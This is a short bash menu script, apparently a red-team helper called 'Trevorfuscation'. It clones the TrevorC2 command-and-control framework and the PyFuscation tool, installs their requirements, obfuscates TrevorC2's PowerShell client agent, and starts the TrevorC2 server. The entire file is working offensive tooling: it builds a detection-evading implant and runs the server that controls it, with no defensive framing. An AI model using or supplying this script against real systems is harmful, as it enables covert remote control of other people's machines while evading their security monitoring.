#!/bin/bash
while :; do
echo "Welcome to Trevorfuscation"
echo "Create by Joas Antonio"
echo "Version 1.0 - Beta"
echo ""
echo "1 - Download Repositorys"
echo "2 - Install Requeriments"
echo "3 - Obfuscation and Server Connect"
echo ""
read -p "Select Options: " option
echo ""

if [ $option -eq 1 ];
then
	echo "Download Repositorys"
	echo ""
	echo ""
	git clone https://github.com/trustedsec/trevorc2 && git clone https://github.com/CBHue/PyFuscation
	echo ""
elif [ $option -eq 2 ];
then
	echo "Install Requeriments"
	echo ""
	cd PyFuscation/  
	pip install -r requirements.txt 
	cd ..
	cd trevorc2/ 
	pip install -r requirements.txt 
	echo ""
elif [ $option -eq 3 ];
then
	echo ""
	echo "Obfuscation and Server Connect"
	echo "1 - Obfuscation Powershell Agent"
	echo "2 - Trevorc2 Server Connect"
	echo ""
	read -p "Obfuscation Agent script: " select2
	echo ""
	if [ $select2 -eq 1 ]
	then
		echo ""
		echo "Obfuscation PS1"
		cp trevorc2/agents/trevorc2_client.ps1 PyFuscation/agent.ps1
		echo ""
		cd PyFuscation/
		python3 PyFuscation.py -fvp --ps agent.ps1
	elif [ $select2 -eq 2 ]
	then
		echo ""
		echo "Trevorc2 Server Connect"
		cd .. && cd trevorc2
		python3 trevorc2_server.py
		echo ""
	fi
fi
done
